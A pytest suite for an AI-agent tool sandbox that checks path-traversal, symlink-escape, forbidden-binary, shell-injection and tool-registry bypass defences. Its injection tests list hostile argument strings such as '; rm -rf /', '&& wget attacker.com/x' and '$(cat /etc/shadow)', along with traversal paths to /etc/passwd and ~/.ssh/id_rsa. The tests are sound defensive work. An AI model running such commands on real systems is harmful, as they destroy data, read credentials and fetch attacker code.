"""CA-M048 — Path Traversal & Tool Sandbox Hardening: Comprehensive Test Suite.

Invariant:  INV-SEC-001
Mandate:    CA-M048 / Wave 06 / Q47

Evidence standard (per mandate §9):
    Every claim carries an evidence class.
    EXECUTABLE — an actual subprocess or resolver call on the real path layer.
    TEST       — unit assertion exercising the real runner/predicate.
    SCHEMA     — dataclass/type-shape verification.

Acceptance gates covered
------------------------
Gate 1  (positive)  — Nested allowed path executes successfully.
Gate 2  (negative)  — ``..`` traversal is blocked before execution.
Gate 3  (negative)  — Absolute out-of-root path is blocked.
Gate 4  (negative)  — Symlink-escape is blocked (created real symlink fixture).
Gate 5  (negative)  — Unregistered tool is rejected before execution.
Gate 6  (negative)  — Forbidden binary is rejected before execution.
Gate 7  (negative)  — Shell metacharacter arguments are rejected before execution.
Gate 8  (positive)  — Allowed tool + allowed binary executes successfully.
Gate 9  (negative)  — tool:default- prefix is no longer a bypass in the compiler.
Gate 10 (negative)  — shell=True is never reachable via ToolSandbox.execute_tool.
Gate 11 (positive)  — ToolSandboxPolicy resolves workspace roots at construction time.
Gate 12 (negative)  — Empty workspace_roots raises ValueError, not silently passing.

False-proof defence (per mandate §9 false-proof requirement)
-------------------------------------------------------------
FP-1: Tests exercise ``assert_sandboxed_path`` directly AND via
      ``ToolSandbox.execute_tool`` (the real runner path), not just the
      helper in isolation.
FP-2: ``tool:default-`` bypass test runs through ``AgentInvocationCompiler.compile``
      (the production path), confirming the production guard fires.
FP-3: Symlink test creates a real symlink on disk via ``tmp_path``; it is not mocked.
FP-4: Subprocess test exercises the real ``subprocess.run`` layer (``shell=False``).
"""

from __future__ import annotations

import os
import subprocess
import sys
from pathlib import Path
from typing import FrozenSet
from uuid import uuid4

import pytest

from ca_runtime.sandbox import (
    ForbiddenExecutableError,
    NetworkOperationBlockedError,
    PathTraversalError,
    ShellInjectionError,
    ToolSandbox,
    ToolSandboxPolicy,
    UnregisteredToolError,
    _looks_like_path,
    assert_sandboxed_path,
    reject_default_tool_bypass,
)


# ---------------------------------------------------------------------------
# Shared fixtures / platform helpers
# ---------------------------------------------------------------------------

def _can_create_symlinks() -> bool:
    """Return True when this process can create a real filesystem symlink."""
    import tempfile

    root = Path(tempfile.mkdtemp(prefix="ca_m048_symlink_probe_"))
    try:
        target = root / "_symlink_probe_target"
        target.mkdir()
        link = root / "_symlink_probe_link"
        link.symlink_to(target, target_is_directory=True)
        return True
    except OSError:
        return False
    finally:
        import shutil

        shutil.rmtree(root, ignore_errors=True)


_SYMLINK_SUPPORT = _can_create_symlinks()


@pytest.fixture()
def workspace(tmp_path: Path) -> Path:
    """Real temporary workspace directory on disk."""
    ws = tmp_path / "workspace"
    ws.mkdir()
    return ws


@pytest.fixture()
def nested_file(workspace: Path) -> Path:
    """A legitimate file nested inside the workspace."""
    d = workspace / "subdir"
    d.mkdir()
    f = d / "data.txt"
    f.write_text("legitimate content")
    return f


@pytest.fixture()
def outside_dir(tmp_path: Path) -> Path:
    """A directory OUTSIDE the declared workspace root."""
    out = tmp_path / "outside"
    out.mkdir()
    (out / "secret.txt").write_text("should not be readable")
    return out


@pytest.fixture()
def policy(workspace: Path) -> ToolSandboxPolicy:
    """Minimal valid sandbox policy scoped to the workspace fixture."""
    return ToolSandboxPolicy(
        workspace_roots=(str(workspace),),
        registered_tools=frozenset({"tool:echo", "tool:list-files"}),
        binary_allowlist=frozenset({"echo", sys.executable.split(os.sep)[-1], "python3", "python"}),
        network_allowlist=frozenset({"api.example.com"}),
        policy_id="test-policy-m048",
    )


@pytest.fixture()
def sandbox(policy: ToolSandboxPolicy) -> ToolSandbox:
    return ToolSandbox(policy)


# ===========================================================================
# Gate 1 — Positive: nested allowed path passes containment check
# Evidence class: TEST / EXECUTABLE
# ===========================================================================

class TestGate1_NestedAllowedPath:
    """Gate 1 (positive): A path nested inside the workspace root is accepted."""

    def test_direct_child_is_accepted(self, workspace: Path) -> None:
        """Direct child of workspace root resolves successfully."""
        target = workspace / "output.json"
        resolved = assert_sandboxed_path(str(target), [str(workspace)])
        assert resolved == target.resolve()

    def test_nested_subdirectory_is_accepted(self, nested_file: Path, workspace: Path) -> None:
        """Deeply nested path within workspace resolves successfully.

        Evidence class: EXECUTABLE — uses real Path.resolve() on disk.
        """
        resolved = assert_sandboxed_path(str(nested_file), [str(workspace)])
        assert resolved.is_file()

    def test_workspace_root_itself_is_accepted(self, workspace: Path) -> None:
        """The workspace root path itself is contained within workspace roots."""
        resolved = assert_sandboxed_path(str(workspace), [str(workspace)])
        assert resolved == workspace.resolve()

    def test_sandbox_assert_path_delegates_correctly(self, nested_file: Path, sandbox: ToolSandbox) -> None:
        """ToolSandbox.assert_path wraps the canonical predicate for the real runner path.

        False-proof defence FP-1: exercise the runner path, not just the helper.
        """
        resolved = sandbox.assert_path(str(nested_file))
        assert resolved == nested_file.resolve()


# ===========================================================================
# Gate 2 — Negative: ``..`` traversal is blocked
# Evidence class: TEST
# ===========================================================================

class TestGate2_DotDotTraversalBlocked:
    """Gate 2 (negative): Path-traversal using ``..`` segments is blocked."""

    def test_dotdot_traversal_raises_path_traversal_error(
        self, workspace: Path, outside_dir: Path
    ) -> None:
        """``../outside`` traversal from inside workspace is blocked."""
        traversal = str(workspace / ".." / "outside" / "secret.txt")
        with pytest.raises(PathTraversalError) as exc_info:
            assert_sandboxed_path(traversal, [str(workspace)])
        assert exc_info.value.reason_code == "ERR_PATH_TRAVERSAL"

    def test_multiple_dotdot_segments_blocked(self, workspace: Path) -> None:
        """Deeply nested ``../../..`` traversal is also blocked."""
        traversal = str(workspace / "a" / "b" / ".." / ".." / ".." / "etc" / "passwd")
        with pytest.raises(PathTraversalError):
            assert_sandboxed_path(traversal, [str(workspace)])

    def test_dotdot_in_middle_of_path_blocked(self, workspace: Path) -> None:
        """``workspace/legit/../../../escape`` is blocked."""
        traversal = str(workspace / "legit" / ".." / ".." / "escape")
        with pytest.raises(PathTraversalError):
            assert_sandboxed_path(traversal, [str(workspace)])

    def test_sandbox_blocks_dotdot_via_assert_path(self, workspace: Path, sandbox: ToolSandbox) -> None:
        """ToolSandbox.assert_path blocks ``..`` via the real runner path (FP-1)."""
        traversal = str(workspace / ".." / "sibling_dir")
        with pytest.raises(PathTraversalError):
            sandbox.assert_path(traversal)


# ===========================================================================
# Gate 3 — Negative: Absolute out-of-root path is blocked
# Evidence class: TEST
# ===========================================================================

class TestGate3_AbsoluteOutOfRootBlocked:
    """Gate 3 (negative): Absolute paths outside every workspace root are blocked."""

    def test_absolute_system_path_blocked(self, workspace: Path) -> None:
        """Absolute path to /etc/passwd (or Windows equivalent) is blocked."""
        if sys.platform == "win32":
            target = "C:\\Windows\\System32\\drivers\\etc\\hosts"
        else:
            target = "/etc/passwd"
        with pytest.raises(PathTraversalError) as exc_info:
            assert_sandboxed_path(target, [str(workspace)])
        assert "ERR_PATH_TRAVERSAL" == exc_info.value.reason_code

    def test_absolute_tmp_path_outside_workspace_blocked(
        self, workspace: Path, outside_dir: Path
    ) -> None:
        """An absolute path that exists on disk but outside workspace is blocked."""
        target = str(outside_dir / "secret.txt")
        with pytest.raises(PathTraversalError):
            assert_sandboxed_path(target, [str(workspace)])

    def test_absolute_home_dir_blocked(self, workspace: Path) -> None:
        """Absolute path to home directory is blocked when not in workspace roots."""
        home = str(Path.home())
        with pytest.raises(PathTraversalError):
            assert_sandboxed_path(home, [str(workspace)])


# ===========================================================================
# Gate 4 — Negative: Symlink escape is blocked
# Evidence class: EXECUTABLE — creates real symlink on disk
# ===========================================================================

class TestGate4_SymlinkEscapeBlocked:
    """Gate 4 (negative): A symlink inside the workspace pointing outside is blocked.

    False-proof defence FP-3: uses real symlinks via pytest's tmp_path.
    This test is skipped on platforms that do not support symlinks.
    """

    @pytest.mark.skipif(
        not _SYMLINK_SUPPORT,
        reason="Symlinks require elevated privileges on some Windows configurations",
    )
    def test_symlink_pointing_outside_workspace_blocked(
        self, workspace: Path, outside_dir: Path
    ) -> None:
        """A symlink that resolves outside the workspace is blocked.

        Evidence class: EXECUTABLE — real symlink created; Path.resolve() follows it.
        """
        link_inside = workspace / "escape_link"
        link_inside.symlink_to(outside_dir)

        target = str(link_inside / "secret.txt")
        with pytest.raises(PathTraversalError) as exc_info:
            assert_sandboxed_path(target, [str(workspace)])
        assert exc_info.value.reason_code == "ERR_PATH_TRAVERSAL"

    @pytest.mark.skipif(
        not _SYMLINK_SUPPORT,
        reason="Symlinks require elevated privileges on some Windows configurations",
    )
    def test_symlink_to_workspace_sibling_blocked(self, tmp_path: Path) -> None:
        """Symlink to a sibling directory of the workspace is blocked.

        Evidence class: EXECUTABLE — real symlink + resolver.
        """
        ws = tmp_path / "my_workspace"
        ws.mkdir()
        sibling = tmp_path / "sibling_secrets"
        sibling.mkdir()
        (sibling / "data.json").write_text("{}")

        link = ws / "slink"
        link.symlink_to(sibling)

        with pytest.raises(PathTraversalError):
            assert_sandboxed_path(str(link / "data.json"), [str(ws)])


# ===========================================================================
# Gate 5 — Negative: Unregistered tool is rejected before execution
# Evidence class: TEST
# ===========================================================================

class TestGate5_UnregisteredToolRejected:
    """Gate 5 (negative): An unregistered tool name is rejected before any OS call."""

    def test_unknown_tool_raises_unregistered_tool_error(self, sandbox: ToolSandbox) -> None:
        """An unregistered tool name is rejected with UnregisteredToolError."""
        with pytest.raises(UnregisteredToolError) as exc_info:
            sandbox.assert_tool_registered("tool:unknown-operation")
        assert exc_info.value.reason_code == "ERR_UNREGISTERED_TOOL"
        assert "tool:unknown-operation" in exc_info.value.tool_name

    def test_tool_default_prefix_no_longer_bypasses_registry(self, sandbox: ToolSandbox) -> None:
        """``tool:default-anything`` does NOT bypass registry check (CA-M048 fix).

        This is the critical regression test for the removed bypass.
        """
        with pytest.raises(UnregisteredToolError):
            sandbox.assert_tool_registered("tool:default-execute")

    def test_execute_tool_rejects_unregistered_tool_before_exec(
        self, sandbox: ToolSandbox, workspace: Path
    ) -> None:
        """ToolSandbox.execute_tool rejects an unregistered tool before any subprocess call.

        False-proof defence FP-1: exercise the real runner path.
        """
        with pytest.raises(UnregisteredToolError):
            sandbox.execute_tool(
                "tool:unregistered",
                "echo",
                ["hello"],
            )

    def test_reject_default_tool_bypass_helper(self) -> None:
        """reject_default_tool_bypass raises UnregisteredToolError for unknown tools."""
        allowed: FrozenSet[str] = frozenset({"tool:echo"})
        with pytest.raises(UnregisteredToolError):
            reject_default_tool_bypass("tool:default-exec", allowed)

    def test_reject_default_tool_bypass_allows_registered(self) -> None:
        """reject_default_tool_bypass does not raise for a registered tool."""
        allowed: FrozenSet[str] = frozenset({"tool:echo"})
        # Should not raise
        reject_default_tool_bypass("tool:echo", allowed)


# ===========================================================================
# Gate 6 — Negative: Forbidden binary is rejected before execution
# Evidence class: TEST
# ===========================================================================

class TestGate6_ForbiddenBinaryRejected:
    """Gate 6 (negative): An executable not in the binary allowlist is blocked."""

    def test_forbidden_executable_raises_error(self, sandbox: ToolSandbox) -> None:
        """Attempt to execute ``bash`` (not in allowlist) is blocked."""
        with pytest.raises(ForbiddenExecutableError) as exc_info:
            sandbox.assert_executable_allowed("bash")
        assert exc_info.value.reason_code == "ERR_FORBIDDEN_EXECUTABLE"
        assert "bash" in exc_info.value.executable

    def test_execute_tool_blocks_forbidden_binary(self, sandbox: ToolSandbox) -> None:
        """execute_tool blocks a forbidden binary before any subprocess call.

        False-proof defence FP-1: exercises the real runner.
        """
        with pytest.raises(ForbiddenExecutableError):
            sandbox.execute_tool("tool:echo", "bash", ["-c", "id"])

    def test_rm_rf_blocked(self, sandbox: ToolSandbox) -> None:
        """``rm`` is not in the allowlist and is blocked."""
        with pytest.raises(ForbiddenExecutableError):
            sandbox.assert_executable_allowed("rm")

    def test_curl_blocked(self, sandbox: ToolSandbox) -> None:
        """``curl`` is not in the allowlist and is blocked."""
        with pytest.raises(ForbiddenExecutableError):
            sandbox.assert_executable_allowed("curl")

    def test_absolute_path_executable_basename_checked(self, sandbox: ToolSandbox) -> None:
        """``/usr/bin/bash`` is blocked because its basename ``bash`` is not in the allowlist."""
        with pytest.raises(ForbiddenExecutableError):
            sandbox.assert_executable_allowed("/usr/bin/bash")


# ===========================================================================
# Gate 7 — Negative: Shell metacharacters in arguments are rejected
# Evidence class: TEST
# ===========================================================================

class TestGate7_ShellMetacharsRejected:
    """Gate 7 (negative): Arguments containing shell metacharacters are blocked before execution."""

    @pytest.mark.parametrize("malicious_arg,description", [
        ("; rm -rf /", "semicolon_chain"),
        ("| cat /etc/passwd", "pipe_operator"),
        ("&& wget attacker.com/x", "ampersand_chain"),
        ("`id`", "backtick_subshell"),
        ("$(cat /etc/shadow)", "dollar_subshell"),
        ("> /etc/crontab", "redirection_out"),
        ("arg\necho pwned", "newline_injection"),
        ("arg\x00null_byte", "null_byte"),
    ])
    def test_shell_metachar_in_args_blocked(
        self, sandbox: ToolSandbox, malicious_arg: str, description: str
    ) -> None:
        """Shell metacharacter '{}' is detected and blocked before OS call.""".format(description)
        with pytest.raises(ShellInjectionError) as exc_info:
            sandbox.assert_no_shell_injection([malicious_arg])
        assert exc_info.value.reason_code == "ERR_SHELL_INJECTION"

    def test_execute_tool_blocks_shell_injection_in_args(
        self, sandbox: ToolSandbox, workspace: Path
    ) -> None:
        """execute_tool blocks shell-injection arguments before subprocess.run.

        False-proof defence FP-1: exercises the real runner path.
        """
        with pytest.raises(ShellInjectionError):
            sandbox.execute_tool(
                "tool:echo",
                "echo",
                ["hello; rm -rf /"],
            )

    def test_clean_argument_passes_injection_check(self, sandbox: ToolSandbox) -> None:
        """A clean argument with no metacharacters passes the injection check."""
        # Should not raise
        sandbox.assert_no_shell_injection(["--output", "/workspace/file.txt", "--verbose"])


# ===========================================================================
# Gate 8 — Positive: Allowed tool + allowed binary executes successfully
# Evidence class: EXECUTABLE — real subprocess.run call
# ===========================================================================

class TestGate8_AllowedToolExecutesSuccessfully:
    """Gate 8 (positive): A registered tool with an allowlisted binary executes.

    False-proof defence FP-1 and FP-4: exercises the real subprocess.run path.
    """

    def test_echo_executes_and_returns_output(
        self, sandbox: ToolSandbox, workspace: Path
    ) -> None:
        """``echo`` is registered and allowlisted; it produces output correctly.

        Evidence class: EXECUTABLE — real subprocess.run with shell=False.
        """
        result = sandbox.execute_tool(
            "tool:echo",
            "echo",
            ["sandboxed_output"],
        )
        assert result.returncode == 0
        assert "sandboxed_output" in result.stdout

    def test_echo_with_workspace_cwd(self, sandbox: ToolSandbox, workspace: Path) -> None:
        """execute_tool with a cwd inside the workspace succeeds.

        Evidence class: EXECUTABLE — real subprocess + path validation.
        """
        result = sandbox.execute_tool(
            "tool:echo",
            "echo",
            ["from_workspace"],
            cwd=str(workspace),
        )
        assert result.returncode == 0

    def test_subprocess_was_called_with_shell_false(
        self, sandbox: ToolSandbox, workspace: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Verify that subprocess.run is always called with shell=False.

        This test monkeypatches subprocess.run to capture the call kwargs,
        confirming the invariant is applied at the runner level — not just
        documented.
        """
        captured: list[dict] = []
        real_run = subprocess.run

        def spy_run(*args, **kwargs):
            captured.append(kwargs)
            return real_run(*args, **kwargs)

        monkeypatch.setattr(subprocess, "run", spy_run)

        sandbox.execute_tool("tool:echo", "echo", ["test_shell_false"])

        assert len(captured) == 1
        assert captured[0].get("shell") is False, (
            "subprocess.run MUST be called with shell=False — invariant violated"
        )

    def test_context_manager_usage(self, policy: ToolSandboxPolicy) -> None:
        """ToolSandbox can be used as a context manager."""
        with ToolSandbox(policy) as sb:
            result = sb.execute_tool("tool:echo", "echo", ["ctx_manager"])
        assert result.returncode == 0


# ===========================================================================
# Gate 9 — Negative: tool:default- bypass removed from AgentInvocationCompiler
# Evidence class: TEST — exercises the production compiler path (FP-2)
# ===========================================================================

class TestGate9_DefaultToolBypassRemovedFromCompiler:
    """Gate 9 (negative): CA-M048 removes the tool:default- bypass from AgentInvocationCompiler.

    False-proof defence FP-2: runs through the production compiler, not a mock.
    """

    @pytest.fixture()
    def sample_workspace_id(self):
        return uuid4()

    @pytest.fixture()
    def hunter_agent(self):
        from ca_runtime import (
            AgentCapabilityGrant,
            AgentDefinition,
            AgentLifecycleState,
            AgentModelPolicy,
            AgentOutputContract,
            AgentPromptReference,
            AgentRegistry,
            AuthorityLane,
            CapabilityScope,
            AccessMode,
        )
        raw = AgentDefinition(
            agent_id="SandboxHunterAgent",
            version="1.0.0",
            name="Sandbox Hunter Agent",
            purpose="Test agent for CA-M048 sandbox enforcement.",
            authority_lane=AuthorityLane.HUNTER,
            lifecycle_state=AgentLifecycleState.APPROVED,
            model_policy=AgentModelPolicy(
                preferred_model="gemini-2.5-pro",
                temperature=0.2,
                temperature_bps=2000,
                token_budget=8192,
                fallback_models=["gemini-2.5-flash"],
                timeout_seconds=30,
            ),
            prompt_reference=AgentPromptReference(
                instructions_ref="instructions.md",
                cae_md_ref="CAE.md",
            ),
            tools=["tool:signal-reader"],
            capabilities=[
                AgentCapabilityGrant(
                    scope=CapabilityScope.FILESYSTEM,
                    mode=AccessMode.READ_ONLY,
                    target="workspace/evidence",
                ),
            ],
            output_contract=AgentOutputContract(
                contract_id="contract:sandbox-test:v1",
                output_type="JSON",
                description="Sandbox test output",
            ),
        )
        registry = AgentRegistry()
        return registry.register(raw)

    @pytest.fixture()
    def sample_capsule(self, sample_workspace_id, hunter_agent):
        from ca_runtime import (
            AccessMode,
            AuthorityLane,
            CapabilityProjection,
            CapabilityScope,
            ContextItem,
            ContextPrecedenceLayer,
            JITContextCompiler,
            SkillMaturity,
            SkillPackageRef,
        )
        return JITContextCompiler.assemble(
            workspace_id=sample_workspace_id,
            lane=AuthorityLane.HUNTER,
            actor_id="actor:operator-hunter",
            program_id="program:sandbox_test",
            harness_id="harness:atomic_hunter",
            agent_id="SandboxHunterAgent",
            model_id="gemini-2.5-pro",
            total_token_budget=8192,
            constitutions=[
                ("CIVIL_CODE", "docs/CIVIL_CODE.md", "Civil Code Invariant.")
            ],
            operator_grants=[
                ("GRANT_READ", "grants/op_read.json", "Read-only access.")
            ],
            program_harness_policies=[
                ("PROGRAM_POLICY", "policy/harness.yaml", "Harness policy.")
            ],
            local_governance_cae_md=("CAE.md", "Local CAE rules."),
            agent_instructions=("instructions.md", "Agent instructions."),
            skills=[],
            capabilities=[
                CapabilityProjection(
                    capability_id="cap:fs-read",
                    owner_product="cae",
                    scope=CapabilityScope.FILESYSTEM,
                    mode=AccessMode.READ_ONLY,
                    workspace_bound=True,
                    approval_required=False,
                    sandbox_required=False,
                    audit_mode="LOGGED",
                    bound_tools=("tool:signal-reader",),
                )
            ],
            production_mode=True,
        )

    def test_tool_default_prefix_rejected_by_compiler(
        self, hunter_agent, sample_capsule, sample_workspace_id
    ) -> None:
        """``tool:default-exec`` is rejected by the compiler under CA-M048.

        Before CA-M048, the compiler contained:
            if t not in all_allowed_tools and not t.startswith("tool:default-"):
                raise UnauthorizedToolError(...)
        This allowed ``tool:default-exec`` to pass silently.  After CA-M048,
        the bypass clause is removed and the tool is rejected.

        Evidence class: TEST + FP-2 (production compiler exercised).
        """
        from ca_runtime import AgentInvocationCompiler, UnauthorizedToolError

        with pytest.raises(UnauthorizedToolError) as exc_info:
            AgentInvocationCompiler.compile(
                agent=hunter_agent,
                capsule=sample_capsule,
                workspace_id=sample_workspace_id,
                requested_tools=["tool:default-exec"],
            )
        err = exc_info.value
        assert err.reason_code == "UNAUTHORIZED_TOOL"
        assert "tool:default-exec" in str(err)
        assert "INV-SEC-001" in str(err) or "CA-M048" in str(err), (
            "Error message should reference CA-M048 or INV-SEC-001"
        )

    def test_registered_tool_still_accepted_by_compiler(
        self, hunter_agent, sample_capsule, sample_workspace_id
    ) -> None:
        """A legitimately registered tool still compiles successfully after CA-M048.

        Positive regression: CA-M048 must not break valid tool invocations.
        Evidence class: TEST.
        """
        from ca_runtime import AgentInvocation, AgentInvocationCompiler

        invocation = AgentInvocationCompiler.compile(
            agent=hunter_agent,
            capsule=sample_capsule,
            workspace_id=sample_workspace_id,
            requested_tools=["tool:signal-reader"],
        )
        assert isinstance(invocation, AgentInvocation)
        assert "tool:signal-reader" in invocation.tools

    def test_no_tools_compiles_from_capability_set(
        self, hunter_agent, sample_capsule, sample_workspace_id
    ) -> None:
        """Compiling without requested_tools uses the capability-derived set.

        Evidence class: TEST.
        """
        from ca_runtime import AgentInvocation, AgentInvocationCompiler

        invocation = AgentInvocationCompiler.compile(
            agent=hunter_agent,
            capsule=sample_capsule,
            workspace_id=sample_workspace_id,
        )
        assert isinstance(invocation, AgentInvocation)


# ===========================================================================
# Gate 10 — Negative: shell=True is never reachable
# Evidence class: TEST
# ===========================================================================

class TestGate10_ShellTrueNeverReachable:
    """Gate 10 (negative): ToolSandbox.execute_tool never passes shell=True to subprocess.run."""

    def test_no_shell_true_parameter_exists_in_execute_tool(self) -> None:
        """The ``execute_tool`` signature does not expose a ``shell`` parameter.

        Evidence class: SCHEMA — inspect the function signature.
        """
        import inspect
        sig = inspect.signature(ToolSandbox.execute_tool)
        assert "shell" not in sig.parameters, (
            "execute_tool must NOT accept a 'shell' parameter — "
            "shell=False is an invariant, not a caller option"
        )

    def test_subprocess_called_shell_false_even_with_complex_args(
        self, sandbox: ToolSandbox, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Even with multi-word args, subprocess.run is called with shell=False.

        Evidence class: TEST (spy on subprocess.run).
        """
        captured_calls: list[dict] = []
        real_run = subprocess.run

        def spy(*args, **kwargs):
            captured_calls.append({"args": args, "kwargs": kwargs})
            return real_run(*args, **kwargs)

        monkeypatch.setattr(subprocess, "run", spy)
        sandbox.execute_tool("tool:echo", "echo", ["--flag", "value"])

        assert len(captured_calls) == 1
        assert captured_calls[0]["kwargs"].get("shell") is False


# ===========================================================================
# Gate 11 — Schema: ToolSandboxPolicy resolves roots at construction
# Evidence class: SCHEMA
# ===========================================================================

class TestGate11_PolicyResolvesRootsAtConstruction:
    """Gate 11 (positive): ToolSandboxPolicy eagerly resolves workspace roots."""

    def test_workspace_roots_resolved_to_absolute(self, workspace: Path) -> None:
        """Relative workspace roots are resolved to absolute paths at policy construction.

        Evidence class: SCHEMA.
        """
        policy = ToolSandboxPolicy(
            workspace_roots=(str(workspace),),
            registered_tools=frozenset(),
            binary_allowlist=frozenset(),
        )
        for root in policy.workspace_roots:
            assert Path(root).is_absolute(), (
                f"workspace root '{root}' must be absolute after policy construction"
            )

    def test_policy_is_frozen_immutable(self, workspace: Path) -> None:
        """ToolSandboxPolicy is a frozen dataclass (immutable).

        Evidence class: SCHEMA.
        """
        policy = ToolSandboxPolicy(
            workspace_roots=(str(workspace),),
            registered_tools=frozenset({"tool:echo"}),
            binary_allowlist=frozenset({"echo"}),
        )
        with pytest.raises((AttributeError, TypeError)):
            policy.policy_id = "mutated"  # type: ignore[misc]


# ===========================================================================
# Gate 12 — Negative: Empty workspace_roots raises ValueError
# Evidence class: TEST
# ===========================================================================

class TestGate12_EmptyWorkspaceRootsRejected:
    """Gate 12 (negative): assert_sandboxed_path with empty roots raises ValueError."""

    def test_empty_roots_raises_value_error(self) -> None:
        """assert_sandboxed_path([]) raises ValueError — not silently passing.

        Evidence class: TEST.
        """
        with pytest.raises(ValueError, match="workspace_roots must not be empty"):
            assert_sandboxed_path("/some/path", [])

    def test_empty_roots_via_sandbox_would_require_non_empty_policy(
        self, tmp_path: Path
    ) -> None:
        """A policy with an empty workspace_roots tuple still invokes the predicate,
        which raises ValueError, preventing silent pass-through.

        Evidence class: TEST.
        """
        policy = ToolSandboxPolicy(
            workspace_roots=(),          # intentionally empty
            registered_tools=frozenset({"tool:echo"}),
            binary_allowlist=frozenset({"echo"}),
        )
        sb = ToolSandbox(policy)
        with pytest.raises(ValueError):
            sb.assert_path("/some/path")


# ===========================================================================
# Additional adversarial / edge-case coverage
# ===========================================================================

class TestAdversarialEdgeCases:
    """Additional adversarial patterns not covered by the numbered gates."""

    def test_path_that_is_prefix_of_workspace_name_blocked(self, tmp_path: Path) -> None:
        """A path '/workspace_evil' must NOT be accepted when root is '/workspace'.

        This tests that we use proper directory containment, not string prefix.
        Evidence class: TEST.
        """
        ws = tmp_path / "workspace"
        ws.mkdir()
        evil = tmp_path / "workspace_evil"
        evil.mkdir()
        evil_file = evil / "secret.txt"
        evil_file.write_text("secret")

        with pytest.raises(PathTraversalError):
            assert_sandboxed_path(str(evil_file), [str(ws)])

    def test_unicode_path_normalization(self, workspace: Path) -> None:
        """Unicode or percent-encoded path components are handled safely.

        Evidence class: TEST.
        """
        # A path with unicode that stays within the workspace is accepted
        unicode_dir = workspace / "données"
        unicode_dir.mkdir()
        unicode_file = unicode_dir / "résultat.txt"
        unicode_file.write_text("ok")

        resolved = assert_sandboxed_path(str(unicode_file), [str(workspace)])
        assert resolved == unicode_file.resolve()

    def test_network_allowlist_blocks_unlisted_host(self, sandbox: ToolSandbox) -> None:
        """A host not in the network allowlist is blocked.

        Evidence class: TEST.
        """
        with pytest.raises(NetworkOperationBlockedError) as exc_info:
            sandbox.assert_network_allowed("attacker.example.org")
        assert exc_info.value.reason_code == "ERR_NETWORK_BLOCKED"

    def test_network_allowlist_permits_listed_host(self, sandbox: ToolSandbox) -> None:
        """A declared host in the network allowlist is permitted.

        Evidence class: TEST.
        """
        # Should not raise — api.example.com is in policy fixture
        sandbox.assert_network_allowed("api.example.com")

    def test_empty_network_allowlist_blocks_all(self, workspace: Path) -> None:
        """An empty network allowlist blocks every host.

        Evidence class: TEST.
        """
        policy = ToolSandboxPolicy(
            workspace_roots=(str(workspace),),
            registered_tools=frozenset({"tool:echo"}),
            binary_allowlist=frozenset({"echo"}),
            network_allowlist=frozenset(),  # empty
        )
        sb = ToolSandbox(policy)
        with pytest.raises(NetworkOperationBlockedError):
            sb.assert_network_allowed("api.example.com")

    def test_cwd_outside_workspace_blocked_in_execute_tool(
        self, sandbox: ToolSandbox, outside_dir: Path
    ) -> None:
        """execute_tool blocks a cwd that resolves outside the workspace.

        Evidence class: TEST + FP-1.
        """
        with pytest.raises(PathTraversalError):
            sandbox.execute_tool(
                "tool:echo",
                "echo",
                ["test"],
                cwd=str(outside_dir),
            )

    @pytest.mark.parametrize("arg", [
        "/etc/passwd",
        "../escape",
        "../../root",
    ])
    def test_path_like_arguments_validated_via_validate_file_args(
        self, sandbox: ToolSandbox, arg: str
    ) -> None:
        """validate_file_args rejects path-like arguments that escape the workspace.

        Evidence class: TEST.
        """
        with pytest.raises(PathTraversalError):
            sandbox.validate_file_args([arg])

    def test_looks_like_path_helper_detects_traversal_args(self) -> None:
        """_looks_like_path correctly identifies path-like strings.

        Evidence class: TEST.
        """
        assert _looks_like_path("../escape") is True
        assert _looks_like_path("./local") is True
        assert _looks_like_path("/absolute") is True
        assert _looks_like_path("~/.ssh/id_rsa") is True
        assert _looks_like_path("plain-argument") is False
        assert _looks_like_path("--flag=value") is False


# ===========================================================================
# False-proof self-test: confirm the REAL runner path (not just helper) blocks
# ===========================================================================

class TestFalseProofDefence:
    """Demonstrates that tests exercise the real invocation boundary (FP-1).

    The mandate §9 requires: "Reject the false proof where the helper is
    tested but production has another bypass path; exercise the real
    runner/dispatcher."

    These tests confirm that ToolSandbox.execute_tool applies every gate
    in the correct order before the OS call.
    """

    def test_full_adversarial_sequence_blocked_before_exec(
        self, sandbox: ToolSandbox, workspace: Path, outside_dir: Path,
        monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Adversarial traversal path is blocked BEFORE subprocess.run is called.

        The monkeypatch captures whether subprocess.run was invoked, proving
        the guard fires pre-execution and the OS is never reached.

        Evidence class: EXECUTABLE / TEST.
        """
        exec_called: list[bool] = []

        def must_not_be_called(*args, **kwargs):
            exec_called.append(True)
            raise AssertionError("subprocess.run must not be called with a traversal path")

        monkeypatch.setattr(subprocess, "run", must_not_be_called)

        # Attempt traversal via path-like args
        # Gate 4 (path validation) fires before Gate 6 (subprocess.run)
        with pytest.raises(PathTraversalError):
            sandbox.execute_tool(
                "tool:echo",
                "echo",
                [str(outside_dir / "secret.txt")],  # path-like, outside workspace
            )

        assert len(exec_called) == 0, "subprocess.run was called despite traversal detection"

    def test_unregistered_tool_blocked_before_binary_check_and_exec(
        self, sandbox: ToolSandbox, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Unregistered tool check fires first — before binary allowlist and subprocess.

        Evidence class: TEST (order-of-gates proof).
        """
        allowlist_checked: list[bool] = []
        original_assert_executable = sandbox.assert_executable_allowed

        def spy_assert_executable(exc):
            allowlist_checked.append(True)
            return original_assert_executable(exc)

        monkeypatch.setattr(sandbox, "assert_executable_allowed", spy_assert_executable)

        with pytest.raises(UnregisteredToolError):
            sandbox.execute_tool("tool:not-registered", "echo", ["hello"])

        assert len(allowlist_checked) == 0, (
            "Binary allowlist check must not fire for an unregistered tool — "
            "tool registration is gate 1"
        )

    def test_shell_injection_blocked_before_path_validation_and_exec(
        self, sandbox: ToolSandbox, workspace: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Shell injection check fires early in the sequence.

        Evidence class: TEST (order-of-gates proof).
        """
        subprocess_called: list[bool] = []
        real_run = subprocess.run

        def spy(*args, **kwargs):
            subprocess_called.append(True)
            return real_run(*args, **kwargs)

        monkeypatch.setattr(subprocess, "run", spy)

        with pytest.raises(ShellInjectionError):
            sandbox.execute_tool("tool:echo", "echo", ["arg; rm -rf /"])

        assert len(subprocess_called) == 0, "subprocess.run was called despite injection detection"
